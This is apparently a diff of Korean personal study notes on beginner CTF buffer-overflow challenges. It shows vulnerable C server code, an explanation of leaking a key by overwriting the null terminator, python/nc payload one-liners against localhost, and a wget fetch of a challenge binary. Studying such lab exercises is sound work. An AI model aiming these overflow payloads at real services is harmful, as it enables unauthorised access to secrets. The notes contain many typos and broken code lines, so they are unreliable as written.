@@ -93,7 +93,7 @@ nonull
 
 char key[MAX_RECV] = {0x00, };
 char gs[4] = {0xadm 0x00, 0x00, 0xff};
-char bug[MAX_RECV] = {0x00, };
+char buf[MAX_RECV] = {0x00, };
 
 fp = fopen("/home/ctf2/key", "r");
 fread(key, 1024m 1m fp);
@@ -102,6 +102,69 @@ fclose(fp);
 recv_data(sock, buf, MAX_RECV + 5);
 send_data(sock, buf, strlen(buf));
 ```
+- key, gs, buf 값 할당  
+- key라는 변수에 key값 들어가 있음  
+
+manage_client 
+
+ebp  
+
+key  
+4byte   
+buf  
+
+esp  
+
+1. 5byte overflow./
+2. 문자열의 끝은 널 바이트(0x00) 구분
+3. 0x00까지 덮으면 문자열이 끝나지 않은 줄 알고 키 값까지 출력
+```   
+apt-get install pyyhon
+(python -c `print"A"*123;cat)|nc localhost 12344
+nc localhost 12344
+잘 모르겠당!
+```
+
+#### random ctf3
+```
+//random 코드
+wget http://javahacking.com/aihacking/nonull
+./random
+nc locallhost 12350
 
 
+char key[16] = {0x00, };
+char buf[64] = {0x00, };
+FILE *fp;
 
+fp = fopen("/dev/urandom", "r");
+fread(key, 4, 1, fp);
+fclose(fp);
+
+recv_data(sock, buf, 69);  //64인데 69 받을수 있기 때문에 버퍼오버플로우!!!  
+strcpy(&key[4], "eroverflow");
+
+if(!strcmp(key, "buferoverflow"))
+       {
+              fp = fopen("/home/ctf3/key", "r");
+              fread(buf, 1024, 1, fp);
+              fclose(fp);
+              
+              send_data(sock, buf, strlen(buf));
+       }
+else {
+              send_data(sock, print, strlen(print));
+              send_data(sock, key, strlen(key));
+       }
+```
+
+#### sub 터미널
+```
+(python -c 'print"A"*64+"buff"';cat)|nc localhost 12350
+```
+
+
+### numgame 
+```
+mkdir ctf4
+cd cr
